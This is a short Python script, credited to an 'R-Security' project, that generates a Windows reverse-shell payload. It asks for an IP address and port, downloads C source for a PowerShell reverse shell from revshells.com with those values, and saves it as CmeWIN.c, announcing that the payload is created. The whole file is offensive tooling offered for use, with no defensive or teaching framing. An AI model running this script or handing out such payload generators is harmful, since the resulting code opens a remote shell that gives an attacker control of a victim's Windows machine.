# Author = Raed Ahsan
# Creation  Date = 06/07/2022
# Project by R-Security
# Linkedin = https://linkedin.com/in/raed-ahsan
# Youtube = https://youtube.com/channel/UCNXIyXPyrzt3YOxgkdEDpuA
# patreon = https://www.patreon.com/raedahsan?fan_landing=true
# Github = https://github.com/R-Security



import requests
import time
def revshell():
    print('\033[1m', "Welcome to Rsecurity CmeWIN generator", '\033[0m')    
    ip = input("Please enter Target IP address: ")
    port = input("Please enter Target PORT: ")
    print("[*] Processing....")
    time.sleep(2)
    capture = requests.get("https://www.revshells.com/C%20Windows?ip={}&port={}&shell=pwsh&encoding=pwsh".format(ip, port), 'html.parser')
    with open("CmeWIN.c", 'w') as payload:
        payload.write(capture.text)
        payload.close()
    print("[*] Congratulations, Payload created")
    print("Located in current directory called CmeWIN.c")
revshell()

